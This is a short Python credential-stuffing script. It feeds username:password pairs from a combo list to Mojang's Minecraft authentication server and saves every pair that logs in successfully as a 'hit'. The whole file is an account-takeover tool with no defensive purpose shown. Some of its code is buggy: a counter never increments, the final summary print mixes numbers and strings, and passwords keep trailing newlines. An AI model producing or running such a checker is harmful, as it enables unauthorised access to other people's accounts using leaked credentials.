import requests
import time
dat = True
jsonheaders = {"Content-Type": "application/json", 'Pragma': 'no-cache'}


auth = 'https://authserver.mojang.com/authenticate'

hits = 0
bad = 0
checks = 0
with open("combo.txt") as f:
    lines = f.readlines()

results = open("results.txt", "a")

def check(user, password):
    payload = ({
            'agent': {
                'name': 'Minecraft',
                'version': 1
            },
            'username': user,
            'password': password,
            'requestUser': 'true'
        })
    r = requests.post(url=auth, json=payload, headers=jsonheaders)
    checks + 1
    if r.status_code == 200:
        return 1
    else:
        return 0

for line in lines:
    a = line.split(':')
    user = a[0]
    pasd = a[1]
    if check(user, pasd) == 1:
        print('[' + user + ':' + pasd + '] Succesful')
        hits += 1
        results.write(user + ':' + pasd)
    else:
        print('[' + user + ':' + pasd + '] Bad')
        bad += 1
print(' Hits : ' + hits + '\n Bads : ' + bad + '\n Total Checked : ' + checks)
